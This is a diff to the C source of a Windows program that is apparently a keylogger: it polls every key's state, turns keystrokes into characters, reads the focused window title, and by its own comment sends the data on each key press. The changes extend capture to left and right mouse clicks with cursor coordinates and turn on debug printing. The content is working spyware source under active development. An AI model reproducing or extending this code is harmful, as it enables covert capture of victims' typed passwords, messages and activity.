@@ -5,7 +5,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 
-#define MSG_BUFF_LEN 15
+#define MSG_BUFF_LEN 16
 
 void vkey_to_char(int vKey, char buffer[MSG_BUFF_LEN]) {
     BYTE keyboardState[256];
@@ -97,7 +97,6 @@ char *handleFocusedWindow() {
     return titleBuff;
 }
 
-
 int main() {
     FlushConsoleInputBuffer(GetStdHandle(STD_INPUT_HANDLE));
     SetConsoleCtrlHandler(ConsoleHandler, TRUE);  // run control c event handler
@@ -139,21 +138,35 @@ int main() {
     int holdClock = 0;
 
     while (1) {
-        for (int vKey = 0x08; vKey <= 0xFE; vKey++) {
+        for (int vKey = 0x01; vKey <= 0xFE; vKey++) {
             // state is bit 1000 0000 0000 0000 if that key is down
             SHORT state = GetAsyncKeyState(vKey);
             // Key is now pressed but wasn't before, !keyStates[vKey] returns True if keyStates[vKey] is 0 / not 1
             if ((state & 0x8000) && !keyStates[vKey]) {
                 keyStates[vKey] = 1;  // Mark as pressed
-
+                printf("VKEY: %d\n", vKey);
+                
                 vkey_to_char(vKey, newMsgBuff);  // modify vkey if necessary and add to buffer before sending
 
                 if (vKey == VK_LCONTROL || vKey == VK_RCONTROL) {
                     strcpy(newMsgBuff, "\xC2\xA9");
                 }
+                // test mouse button l and mouse button R at home and commit (update TODO.text) and push to remote
+                else if (vKey == VK_LBUTTON) {
+                    POINT cursorPos;
+                    if (GetCursorPos(&cursorPos)) {
+                        sprintf(newMsgBuff, "ML - (%d, %d)", cursorPos.x, cursorPos.y);
+                    }
+                } 
+                else if (vKey == VK_RBUTTON) {
+                    POINT cursorPos;
+                    if (GetCursorPos(&cursorPos)) {
+                        sprintf(newMsgBuff, "MR - (%d, %d)", cursorPos.x, cursorPos.y);
+                    }
+                }
 
                 if (newMsgBuff[0] != '\0') {
-                    // printf("Typed: %s\n", newMsgBuff);
+                    printf("Typed: %s\n", newMsgBuff);
                     // we send upon a detected key press
                     windowCapBuff = handleFocusedWindow();
                     uint8_t capLen = (uint8_t)strlen(windowCapBuff);
